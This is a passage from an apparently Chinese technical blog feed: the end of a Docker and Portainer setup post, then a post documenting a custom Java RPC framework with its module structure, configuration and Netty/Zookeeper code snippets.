class="hljs-comment">#  重启服务 </span><br>docker-compose start     <span class="hljs-comment">#  启动服务 </span><br>docker-compose stop      <span class="hljs-comment">#  停止服务 </span><br></code></pre></td></tr></table></figure><h2 id="12-Docker-Portainer"><a href="#12-Docker-Portainer" class="headerlink" title="12. Docker Portainer"></a>12. Docker Portainer</h2><p>安装命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -d -p <span class="hljs-number">8000</span>:<span class="hljs-number">8000</span> -p <span class="hljs-number">9000</span>:<span class="hljs-number">9000</span> --name portainer --restart=always -v <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/docker.sock:/</span>var<span class="hljs-regexp">/run/</span>docker.sock -v portainer_data:<span class="hljs-regexp">/data portainer/</span>portainer<br></code></pre></td></tr></table></figure><p>通过虚拟机访问Portainner</p>]]></content>
    
    
    <categories>
      
      <category>容器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>部署</tag>
      
      <tag>容器化</tag>
      
      <tag>服务器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RPC项目记录</title>
    <link href="/2022/12/07/RPC%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/12/07/RPC%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/ltyzzzxxx/ltyzzz-rpc">https://github.com/ltyzzzxxx/ltyzzz-rpc</a></p><h1 id="RPC项目树"><a href="#RPC项目树" class="headerlink" title="RPC项目树"></a>RPC项目树</h1><h2 id="模块树"><a href="#模块树" class="headerlink" title="模块树"></a>模块树</h2><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xl">├── rpc-consumer<br>│   ├── <span class="hljs-function"><span class="hljs-title">rpc</span>-consumer-demo-&gt;</span> 未接入spring：consumer测试类<br>│   └── <span class="hljs-function"><span class="hljs-title">rpc</span>-consumer-spring-&gt;</span> 接入spring：consumer本地服务接口<br>├── <span class="hljs-function"><span class="hljs-title">rpc</span>-core-&gt;</span> rpc核心实现逻辑模块<br>├── <span class="hljs-function"><span class="hljs-title">rpc</span>-interface-&gt;</span> 远程服务接口<br>├── rpc-provider<br>│   ├── <span class="hljs-function"><span class="hljs-title">rpc</span>-provider-demo-&gt;</span> 未接入spring：provider测试类<br>│   ├── <span class="hljs-function"><span class="hljs-title">rpc</span>-provider-goods    -&gt;</span> 接入spring：provider远程服务<br>│   ├── <span class="hljs-function"><span class="hljs-title">rpc</span>-provider-pay        -&gt;</span> 接入spring：provider远程服务<br>│   └── <span class="hljs-function"><span class="hljs-title">rpc</span>-provider-user-&gt;</span> 接入spring：provider远程服务<br>├── <span class="hljs-function"><span class="hljs-title">rpc</span>-spring-starter-&gt;</span> spring-starter接入类<br>└── <span class="hljs-function"><span class="hljs-title">simple</span>-rpc-&gt;</span> 简易rpc<br></code></pre></td></tr></table></figure><h2 id="核心模块树"><a href="#核心模块树" class="headerlink" title="核心模块树"></a>核心模块树</h2><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xl">├── <span class="hljs-function"><span class="hljs-title">annotations</span>                 -&gt;</span> 项目注解包<br>├── <span class="hljs-function"><span class="hljs-title">cache</span>-&gt;</span> 项目全局缓存<br>├── <span class="hljs-function"><span class="hljs-title">client</span>-&gt;</span> 客户端相关类（请求处理、启动加载）<br>├── <span class="hljs-function"><span class="hljs-title">common</span>-&gt;</span> 通用模块<br>├── <span class="hljs-function"><span class="hljs-title">config</span>-&gt;</span> 项目配置（服务端、客户端属性配置）<br>├── <span class="hljs-function"><span class="hljs-title">constants</span>-&gt;</span> 项目常量<br>├── <span class="hljs-function"><span class="hljs-title">dispatcher</span>-&gt;</span> 服务端请求解耦<br>├── <span class="hljs-function"><span class="hljs-title">event</span>-&gt;</span> 事件监听机制<br>├── <span class="hljs-function"><span class="hljs-title">exception</span>-&gt;</span> 全局异常<br>├── <span class="hljs-function"><span class="hljs-title">filter</span>-&gt;</span> 责任链模式过滤请求<br>├── <span class="hljs-function"><span class="hljs-title">proxy</span>-&gt;</span> 动态代理<br>├── <span class="hljs-function"><span class="hljs-title">registry</span>-&gt;</span> 注册中心<br>├── <span class="hljs-function"><span class="hljs-title">router</span>-&gt;</span> 路由选择负载均衡<br>├── <span class="hljs-function"><span class="hljs-title">serialize</span>-&gt;</span> 序列化与反序列化<br>├── <span class="hljs-function"><span class="hljs-title">server</span>-&gt;</span> 服务端相关类（请求处理、启动加载）<br>├── <span class="hljs-function"><span class="hljs-title">service</span>-&gt;</span> 测试服务接口<br>├── <span class="hljs-function"><span class="hljs-title">spi</span>-&gt;</span> SPI自定义加载类<br>└── <span class="hljs-function"><span class="hljs-title">utils</span>-&gt;</span> 项目工具包<br></code></pre></td></tr></table></figure><h1 id="RPC项目测试"><a href="#RPC项目测试" class="headerlink" title="RPC项目测试"></a>RPC项目测试</h1><h2 id="普通测试"><a href="#普通测试" class="headerlink" title="普通测试"></a>普通测试</h2><ol><li><p>进入rpc-provider&#x2F;rpc-provider-demo模块下，运行ProviderDemo主方法</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221214155224257.png" alt="image-20221214155224257" style="zoom:50%;" /></li><li><p>进入rpc-consumer&#x2F;rpc-consumer-demo模块下，运行ConsumerDemo主方法</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221214155301390.png" alt="image-20221214155301390" style="zoom:50%;" /></li></ol><h2 id="接入Springboot测试"><a href="#接入Springboot测试" class="headerlink" title="接入Springboot测试"></a>接入Springboot测试</h2><ol><li><p>进入rpc-provider模块下，分别运行rpc-provider-goods、rpc-provider-pay、rpc-provider-user三个服务启动类</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221214155517934.png" alt="image-20221214155517934" style="zoom: 50%;" /><ol start="2"><li><p>进入rpc-consumer&#x2F;rpc-consumer-spring模块下，运行服务启动类</p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/image-20221214155636798.png" alt="image-20221214155636798" style="zoom:50%;" /></li><li><p>Consumer默认端口为8081，在浏览器中输入 <a href="http://localhost:8081/api-test/do-test">http://localhost:8081/api-test/do-test</a> 进行远程服务调用基本测试</p></li></ol></li></ol><h2 id="自定义配置"><a href="#自定义配置" class="headerlink" title="自定义配置"></a>自定义配置</h2><p>在项目模块的resouces文件下，有 <code>irpc.properties</code> 文件，用于配置Consumer（服务消费者）与Provider（服务提供者）的基本属性</p><ol><li><p>Consumer基本配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 应用名</span><br><span class="hljs-attr">irpc.applicationName</span>=<span class="hljs-string">irpc-consumer</span><br><span class="hljs-comment"># 注册中心地址</span><br><span class="hljs-attr">irpc.registerAddr</span>=<span class="hljs-string">localhost:2181</span><br><span class="hljs-comment"># 注册中心类型</span><br><span class="hljs-attr">irpc.registerType</span>=<span class="hljs-string">zookeeper</span><br><span class="hljs-comment"># 动态代理类型</span><br><span class="hljs-attr">irpc.proxyType</span>=<span class="hljs-string">javassist</span><br><span class="hljs-comment"># 路由策略类型</span><br><span class="hljs-attr">irpc.router</span>=<span class="hljs-string">rotate</span><br><span class="hljs-comment"># 序列化类型</span><br><span class="hljs-attr">irpc.clientSerialize</span>=<span class="hljs-string">jdk</span><br><span class="hljs-comment"># 请求超时时间</span><br><span class="hljs-attr">irpc.client.default.timeout</span>=<span class="hljs-string">3000</span><br><span class="hljs-comment"># 最大发送数据包</span><br><span class="hljs-attr">irpc.client.max.data.size</span>=<span class="hljs-string">4096</span><br></code></pre></td></tr></table></figure></li><li><p>Provider基本配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 服务提供者端口号</span><br><span class="hljs-attr">irpc.serverPort</span>=<span class="hljs-string">9021</span><br><span class="hljs-comment"># 服务提供者名称</span><br><span class="hljs-attr">irpc.applicationName</span>=<span class="hljs-string">good-provider</span><br><span class="hljs-comment"># 注册中心地址</span><br><span class="hljs-attr">irpc.registerAddr</span>=<span class="hljs-string">localhost:2181</span><br><span class="hljs-comment"># 注册中心类型</span><br><span class="hljs-attr">irpc.registerType</span>=<span class="hljs-string">zookeeper</span><br><span class="hljs-comment"># 序列化类型</span><br><span class="hljs-attr">irpc.serverSerialize</span>=<span class="hljs-string">fastJson</span><br><span class="hljs-comment"># 服务端异步处理队列大小</span><br><span class="hljs-attr">irpc.server.queue.size</span>=<span class="hljs-string">513</span><br><span class="hljs-comment"># 服务端线程池大小</span><br><span class="hljs-attr">irpc.server.biz.thread.nums</span>=<span class="hljs-string">257</span><br><span class="hljs-comment"># 服务端最大连接数</span><br><span class="hljs-attr">irpc.server.max.connection</span>=<span class="hljs-string">100</span><br><span class="hljs-comment"># 服务端可接收数据包最大值</span><br><span class="hljs-attr">irpc.server.max.data.size</span>=<span class="hljs-string">4096</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="RPC项目介绍"><a href="#RPC项目介绍" class="headerlink" title="RPC项目介绍"></a>RPC项目介绍</h1><h2 id="1-引入Proxy代理层"><a href="#1-引入Proxy代理层" class="headerlink" title="1. 引入Proxy代理层"></a>1. 引入Proxy代理层</h2><p>采用JDK类代理，执行的逻辑为：将请求方法放入SEND_QUEUE队列中，自旋等待结果响应结果（从RESP_MAP中取出）</p><p>关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">RESP_MAP.put(rpcInvocation.getUuid(), OBJECT);<br>SEND_QUEUE.add(rpcInvocation); <span class="hljs-comment">// 放入阻塞队列中</span><br><span class="hljs-comment">// 可以设置超时时间</span><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> RESP_MAP.get(rpcInvocation.getUuid());<br>    <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> RpcInvocation) &#123;<br>        <span class="hljs-keyword">return</span> ((RpcInvocation) object).getResponse();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-1-基本流程"><a href="#1-1-基本流程" class="headerlink" title="1.1 基本流程"></a>1.1 基本流程</h3><ol><li><p>Client启动时会开启一个异步线程阻塞队列，等待接收代理类放入的RpcInvocation，并将其顺序发送给对应Server</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">asyncSendJob.start();<br><span class="hljs-comment">// 异步线程 run代码：真正执行网络通信的操作</span><br><span class="hljs-type">RpcInvocation</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> SEND_QUEUE.take(); <span class="hljs-comment">// 阻塞等待接收代理类放入RpcInvocation</span><br><span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> JSON.toJSONString(data);<br><span class="hljs-type">RpcProtocol</span> <span class="hljs-variable">rpcProtocol</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RpcProtocol</span>(json.getBytes());<br><span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">channelFuture</span> <span class="hljs-operator">=</span> ConnectionHandler.getChannelFuture(data.getTargetServiceName());<br>channelFuture.channel().writeAndFlush(rpcProtocol);<br></code></pre></td></tr></table></figure></li><li><p>Client先通过代理类为RpcInvocation（RpcProtocol中content的具体实现）设置必要的参数，</p><ul><li>如：目标服务、目标方法、参数、UUID等，其中UUID是为了保证Client接收结果时判断一致</li></ul><p>代理类还有如下几点核心操作：</p><ul><li>将该uuid放入一个结果集map中，key为uuid，value为NULL对象</li><li>将封装好的RpcInvocation类放入阻塞队列中</li><li>最后代理类开始自旋一定时间，从结果集map中通过uuid获取其value：RpcInvocation，从中获取response结果</li></ul></li><li><p>异步线程阻塞队列阻塞式地获取到RpcInvocation后，将其再次封装为RpcProtocol（包含有magicNumber、content、contentLength），经过Encoder编码后发送给Server</p></li><li><p>Server收到后进行Decode解码，ServerHandler将解码后的结果转为RpcProtocol，并获取其content，将content再转为RpcInvocation类。从该类中获取对应的目标服务属性，通过该属性从map（专门用来保存已经注册的服务信息）中找到对应服务，再通过目标方法属性从服务中找到对应的方法，并invoke执行得到返回结果。</p><p>注意，之前传递的RpcInvocation类的response为空，为它set返回结果。</p><p>最后将完整的RpcInvocation再次封装为RpcProtocol类并通过Encoder编码发送给Client</p></li><li><p>Client通过Decoder将数据包解码，经由ClientHandler将解码后的结果转为RpcProtocol，再将其cotent转为RpcInvocation，通过之前的结果集map判断请求与响应是否一致。若一致，则将其放入结果集map，此时自旋等待的代理类便可从中取到RpcInvocation，并返回给Client。</p></li></ol><h2 id="2-引入Zookeeper注册中心"><a href="#2-引入Zookeeper注册中心" class="headerlink" title="2. 引入Zookeeper注册中心"></a>2. 引入Zookeeper注册中心</h2><p>Zookeeper节点</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/irpc/</span>com.ltyzzz.core.service.DataService<span class="hljs-regexp">/provider/</span><span class="hljs-number">10.249</span>.<span class="hljs-number">19.183</span>:<span class="hljs-number">9093</span><br></code></pre></td></tr></table></figure><p>添加Zookeeper注册中心后</p><h3 id="2-1-Server端实现"><a href="#2-1-Server端实现" class="headerlink" title="2.1 Server端实现"></a>2.1 Server端实现</h3><p>Server main代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Server</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Server</span>();<br>server.initServerConfig(); <span class="hljs-comment">// 初始化当前服务提供者的基本信息</span><br>server.exportService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DataServiceImpl</span>()); <span class="hljs-comment">// 暴露所提供的服务接口</span><br>server.startApplication(); <span class="hljs-comment">// 启动服务端</span><br></code></pre></td></tr></table></figure><ul><li><p>在exportService方法中，将服务添加map中，服务提供者添加到set中</p><p>URL类是配置类，基于其进行存储</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">PROVIDER_CLASS_MAP.put(interfaceClass.getName(), serviceBean);<br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>();<br>url.setServiceName(interfaceClass.getName());<br>url.setApplicationName(serverConfig.getApplicationName());<br>url.addParameter(<span class="hljs-string">&quot;host&quot;</span>, CommonUtils.getIpAddress());<br>url.addParameter(<span class="hljs-string">&quot;port&quot;</span>, String.valueOf(serverConfig.getServerPort()));<br>PROVIDER_URL_SET.add(url); <br></code></pre></td></tr></table></figure></li><li><p>在startApplication方法中，调用batchExportUrl方法，开启异步任务，从PROVIDER_URL_SET中获取URL，进行服务注册</p><p>其中registerService由ZookeeperRegister实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">registryService.register(url); <span class="hljs-comment">// 注册该服务 -&gt; 本质是在Zookeeper中建立相应的节点</span><br><span class="hljs-comment">// register方法中除了建立节点，还需要将URL添加到PROVIDER_URL_SET中</span><br><span class="hljs-comment">// -&gt; PROVIDER_URL_SET.add(url);</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="2-2-Client端实现"><a href="#2-2-Client端实现" class="headerlink" title="2.2 Client端实现"></a>2.2 Client端实现</h3><p>Client main代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Client</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>();<br><span class="hljs-type">RpcReference</span> <span class="hljs-variable">rpcReference</span> <span class="hljs-operator">=</span> client.initClientApplication(); <span class="hljs-comment">//RpcReference用于实现JDK代理</span><br><span class="hljs-type">DataService</span> <span class="hljs-variable">dataService</span> <span class="hljs-operator">=</span> rpcReference.getProxy(DataService.class);<br>client.doSubscribeService(DataService.class); <span class="hljs-comment">// 订阅DataService类</span><br>ConnectionHandler.setBootstrap(client.getBootstrap()); <span class="hljs-comment">// 为ConnectionHandler设置bootstrap，具体参照2.4</span><br>client.doConnectServer(); <span class="hljs-comment">// 建立连接 -&gt; 本质是</span><br>client.startClient(); <span class="hljs-comment">// 开启异步任务，进行网络通信，具体操作仍为阻塞队列逻辑</span><br></code></pre></td></tr></table></figure><ul><li><p>在initClientApplication方法中，除了进行Bootstrap等与Netty相关的初始化操作外，还进行了事件监听器的初始化</p><p>在init方法中，向iRpcListenerLoader中添加了ServiceUpdateListener监听器</p><p>监听事件参照 <code>2.3</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">iRpcListenerLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IRpcListenerLoader</span>();<br>iRpcListenerLoader.init();<br></code></pre></td></tr></table></figure></li><li><p>在doSubscribeService方法中，初始化ZookeeperRegister，定义URL。根据此URL订阅相应的服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>();<br>url.setApplicationName(clientConfig.getApplicationName());<br>url.setServiceName(serviceBean.getName());<br>url.addParameter(<span class="hljs-string">&quot;host&quot;</span>, CommonUtils.getIpAddress());<br>abstractRegister.subscribe(url); <span class="hljs-comment">// 订阅该服务 -&gt; 本质是在Zookeeper中建立相应的节点</span><br><span class="hljs-comment">// register方法中除了建立节点，还需要将URL添加到SUBSCRIBE_SERVICE_LIST中</span><br><span class="hljs-comment">// -&gt; SUBSCRIBE_SERVICE_LIST.add(url.getServiceName());</span><br></code></pre></td></tr></table></figure></li><li><p>在doConnectServer方法中，提前与所有已注册的服务建立连接，并监听这些服务的变化（上线、下线、更改等）</p><ol><li>监听事件参照 <code>2.3</code></li><li>ConnectionHandler建立连接逻辑参照 <code>2.4</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (String providerServiceName : SUBSCRIBE_SERVICE_LIST) &#123;<br>    <span class="hljs-comment">// getProviderIps方法获得形如「10.249.19.183:9093」此类的IP地址列表</span><br>    List&lt;String&gt; providerIps = abstractRegister.getProviderIps(providerServiceName);<br>    <span class="hljs-keyword">for</span> (String providerIp : providerIps) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// connect方法作用为往CONNECT_MAP中放相应的连接</span><br>            ConnectionHandler.connect(providerServiceName, providerIp);<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            logger.error(<span class="hljs-string">&quot;[doConnectServer] connect fail &quot;</span>, e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>();<br>    url.setServiceName(providerServiceName);<br>    <span class="hljs-comment">// 开启Watcher监听事件</span><br>    abstractRegister.doAfterSubscribe(url);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-3-监听事件机制实现"><a href="#2-3-监听事件机制实现" class="headerlink" title="2.3 监听事件机制实现"></a>2.3 监听事件机制实现</h3><p>订阅之后开启监听事件，主要用于监听已注册服务的变化</p><ol><li><p>IRpcListenerLoader：用于注册与管理监听器。当事件发生时，调用相应的监听器回调方法</p><p>IRpcEvent为发生事件接口，IRpcListener为事件监听器接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;IRpcListener&gt; iRpcListenerList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">eventThreadPool</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">2</span>); <span class="hljs-comment">// 执行回调callBack方法</span><br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">├── register<span class="hljs-constructor">Listener(IRpcListener <span class="hljs-params">iRpcListener</span>)</span> <span class="hljs-comment">// 注册监听器事件</span><br>├── send<span class="hljs-constructor">Event(IRpcEvent <span class="hljs-params">iRpcEvent</span>)</span> <span class="hljs-comment">// 调用监听器对应回调方法</span><br></code></pre></td></tr></table></figure><p>sendEvent方法实现如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (IRpcListener&lt;?&gt; iRpcListener : iRpcListenerList) &#123;<br>    <span class="hljs-comment">// 获取listener上监听事件的泛型</span><br>    Class&lt;?&gt; type = getInterfaceT(iRpcListener);<br>    <span class="hljs-comment">// 判断Listener监听事件的泛型是否与Watcher传递的一致</span><br>    <span class="hljs-keyword">if</span>(type.equals(iRpcEvent.getClass()))&#123;<br>        eventThreadPool.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">// 一致则异步回调处理</span><br>                    iRpcListener.callBack(iRpcEvent.getData());<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>主要监听逻辑位于ZookeeperRegister中的watchChildNodeData方法，如下：</p><p>当监听的Zookeeper服务Node发生变化时，触发Watcher事件，Watcher内调用ListenerLoader方法（事件为方法参数），由ListenerLoader寻找对应的Listener（通过传入的事件与Listener泛型上的事件对比）。</p><ul><li>URLChangeWrapper对应为发生变化的URL包装类：包括serviceName与providerUrlList</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(WatchedEvent watchedEvent)</span> &#123;<br>    System.out.println(watchedEvent);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> watchedEvent.getPath();<br>    List&lt;String&gt; childrenData = zkClient.getChildrenData(path);<br>    <span class="hljs-type">URLChangeWrapper</span> <span class="hljs-variable">urlChangeWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLChangeWrapper</span>();<br>    urlChangeWrapper.setProviderUrl(childrenData);<br>    urlChangeWrapper.setServiceName(path.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">2</span>]);<br>    <span class="hljs-type">IRpcEvent</span> <span class="hljs-variable">iRpcEvent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IRpcUpdateEvent</span>(urlChangeWrapper);<br>    IRpcListenerLoader.sendEvent(iRpcEvent);<br><span class="hljs-comment">// 继续循环监听</span><br>    watchChildNodeData(path);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="2-4-ConnectionHandler实现"><a href="#2-4-ConnectionHandler实现" class="headerlink" title="2.4 ConnectionHandler实现"></a>2.4 ConnectionHandler实现</h3><p>按照单一职责的设计原则，将与连接有关的功能都统一封装在了一起。</p><p>主要用于Netty在客户端与服务端之间建立连接、断开连接、按照服务名获取连接等操作。</p><ol><li><p>建立连接逻辑如下：connect方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 形如 10.249.19.183:9093</span><br>String[] providerAddress = providerIp.split(<span class="hljs-string">&quot;:&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> providerAddress[<span class="hljs-number">0</span>];<br><span class="hljs-type">Integer</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> Integer.valueOf(providerAddress[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// 关键代码：创建ChannelFuture，即与目的服务简历底层通信连接</span><br><span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">channelFuture</span> <span class="hljs-operator">=</span> bootstrap.connect(ip, port).sync();<br><span class="hljs-comment">// 连接包装类对象</span><br><span class="hljs-type">ChannelFutureWrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelFutureWrapper</span>();<br>wrapper.setChannelFuture(channelFuture);<br>wrapper.setHost(ip);<br>wrapper.setPort(port);<br>SERVER_ADDRESS.add(providerIp);<br>List&lt;ChannelFutureWrapper&gt; channelFutureWrappers = CONNECT_MAP.get(providerServiceName);<br><span class="hljs-keyword">if</span> (CommonUtils.isEmptyList(channelFutureWrappers)) &#123;<br>    channelFutureWrappers = <span 